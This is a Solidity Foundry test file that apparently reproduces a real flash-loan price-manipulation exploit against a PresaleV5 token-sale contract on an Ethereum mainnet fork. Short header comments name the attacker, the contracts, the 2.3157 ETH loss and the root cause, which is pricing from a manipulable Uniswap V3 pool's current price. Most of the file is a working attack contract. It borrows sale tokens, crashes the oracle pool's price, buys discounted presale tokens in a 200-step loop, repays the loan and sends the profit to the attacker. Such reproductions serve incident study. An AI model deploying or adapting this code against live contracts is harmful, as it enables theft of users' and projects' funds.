// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 2.3157 ETH
// Attacker : 0x3A7e13DaCCCD3de56B8186987F348Bfd21Dc4Ec5
// Attack Contract : 0xdc781c9714382E9F973e9d687aCae0fb37225F52
// Vulnerable Contract : 0x9a15bb3A8feC8d0d810691BafE36F6e5D42360f7
// Attack Tx : https://etherscan.io/tx/0x0ef0cde3d8348fdced3adf7d0475ec1364236dd6ab1d8580addad96b004b604a
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x09c135aacd4a82b08890e930dfdc3143b4578d45#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1688
//
// Attack summary: The attacker flash-borrowed the sale token, sold it into the Uniswap V3 pool used as the
// presale price oracle, bought discounted presale tokens through buyWithEth, sold the received tokens back into
// the same manipulated pool, and repeated the cycle before repaying the flash loan.
// Root cause: PresaleV5 priced buyWithEth from the current slot0 of a manipulable V3 pool without a TWAP or
// independent oracle check, letting a flash-loan-funded attacker change the sale-token price inside one tx.

address constant ATTACKER = 0x3a7E13dACccd3dE56b8186987F348bFd21dc4Ec5;
address constant VULNERABLE_CONTRACT = 0x9a15bB3a8FEc8d0d810691BAFE36f6e5d42360F7;
address constant PRESALE_IMPL_AT_BLOCK = 0x09c135AACd4a82B08890e930DFDC3143B4578d45;
address constant SALE_TOKEN = 0xccB365D2e11aE4D6d74715c680f56cf58bF4bF10;
address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant SWAP_ROUTER = 0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45;
address constant MANIPULATED_POOL = 0xA3C2076eB97D573CC8842f1Db1ECDF7B6F77ba27;
address constant FLASH_POOL = 0x9DeDf5bb0d5921C057f2e62Aa36Ce48bca127f7c;

uint24 constant MANIPULATED_POOL_FEE = 3000;
uint24 constant FLASH_POOL_FEE = 10_000;
uint256 constant FLASH_BORROW_AMOUNT = 502_970_865_652_897_166_554_244_795;

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(
        uint256 wad
    ) external;
}

interface IPresaleV5 {
    function fetchPrice(
        uint256 amountOut
    ) external view returns (uint256);
    function buyWithEth(
        uint256 amount,
        bool stake
    ) external payable returns (bool);
}

interface IUniswapV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}

interface ISwapRouter02 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
    function exactOutputSingle(
        ExactOutputSingleParams calldata params
    ) external payable returns (uint256 amountIn);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 23_172_639;
        vm.createSelectFork("mainnet", forkBlock);

        vm.label(ATTACKER, "Attacker");
        vm.label(VULNERABLE_CONTRACT, "PresaleV5 proxy");
        vm.label(PRESALE_IMPL_AT_BLOCK, "PresaleV5 implementation at attack block");
        vm.label(SALE_TOKEN, "Sale token");
        vm.label(WETH, "WETH");
        vm.label(SWAP_ROUTER, "Uniswap SwapRouter02");
        vm.label(MANIPULATED_POOL, "Manipulated V3 pool");
        vm.label(FLASH_POOL, "Flash V3 pool");
    }

    function testExploit() public {
        vm.deal(ATTACKER, 0);
        uint256 attackerEthBefore = ATTACKER.balance;

        vm.startPrank(ATTACKER);
        PresaleV5Attacker localAttacker = new PresaleV5Attacker(ATTACKER);
        vm.label(address(localAttacker), "Local PresaleV5 attacker");
        localAttacker.execute();
        vm.stopPrank();

        uint256 attackerEthAfter = ATTACKER.balance;
        emit log_named_decimal_uint("Attacker ETH profit", attackerEthAfter - attackerEthBefore, 18);
        assertGt(attackerEthAfter - attackerEthBefore, 2.3 ether);
    }
}

contract PresaleV5Attacker {
    IERC20Minimal private constant token = IERC20Minimal(SALE_TOKEN);
    IWETH private constant weth = IWETH(WETH);
    IPresaleV5 private constant presale = IPresaleV5(VULNERABLE_CONTRACT);
    ISwapRouter02 private constant router = ISwapRouter02(SWAP_ROUTER);

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute() external {
        IUniswapV3Pool(FLASH_POOL).flash(address(this), 0, FLASH_BORROW_AMOUNT, abi.encode(FLASH_BORROW_AMOUNT));

        _wrapEthBalance();
        _exactInput(WETH, SALE_TOKEN, MANIPULATED_POOL_FEE, weth.balanceOf(address(this)));
        _exactInput(SALE_TOKEN, WETH, FLASH_POOL_FEE, token.balanceOf(address(this)));
        _unwrapWethBalance();

        (bool sent,) = payable(profitReceiver).call{value: address(this).balance}("");
        require(sent, "profit transfer failed");
    }

    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        require(msg.sender == FLASH_POOL, "unexpected flash pool");
        require(fee0 == 0, "unexpected token0 fee");

        uint256 borrowed = abi.decode(data, (uint256));
        token.approve(SWAP_ROUTER, type(uint256).max);
        weth.approve(SWAP_ROUTER, type(uint256).max);

        _exactInput(SALE_TOKEN, WETH, MANIPULATED_POOL_FEE, token.balanceOf(address(this)));
        _unwrapWethBalance();

        uint256 quote = presale.fetchPrice(1 ether);
        uint256 firstBuyAmount = ((address(this).balance * 17) / 100) / quote;
        presale.buyWithEth{value: address(this).balance}(firstBuyAmount, false);

        for (uint256 i = 0; i < 200; i++) {
            _wrapEthBalance();
            _exactInput(SALE_TOKEN, WETH, MANIPULATED_POOL_FEE, token.balanceOf(address(this)));

            quote = presale.fetchPrice(1 ether);
            _unwrapWethBalance();

            uint256 buyAmount = 0.3 ether / quote;
            presale.buyWithEth{value: address(this).balance}(buyAmount, false);
        }

        uint256 owed = borrowed + fee1;
        uint256 tokenBalance = token.balanceOf(address(this));
        if (tokenBalance < owed) {
            _wrapEthBalance();
            _exactOutput(WETH, SALE_TOKEN, MANIPULATED_POOL_FEE, owed - tokenBalance);
        }

        token.transfer(FLASH_POOL, owed);
    }

    function _exactInput(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn
    ) private returns (uint256 amountOut) {
        if (amountIn == 0) return 0;

        return router.exactInputSingle(
            ISwapRouter02.ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: fee,
                recipient: address(this),
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _exactOutput(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountOut
    ) private returns (uint256 amountIn) {
        if (amountOut == 0) return 0;

        return router.exactOutputSingle(
            ISwapRouter02.ExactOutputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: fee,
                recipient: address(this),
                amountOut: amountOut,
                amountInMaximum: type(uint256).max,
                sqrtPriceLimitX96: 0
            })
        );
    }

    function _wrapEthBalance() private {
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            weth.deposit{value: ethBalance}();
        }
    }

    function _unwrapWethBalance() private {
        uint256 wethBalance = weth.balanceOf(address(this));
        if (wethBalance > 0) {
            weth.withdraw(wethBalance);
        }
    }

    receive() external payable {}
}
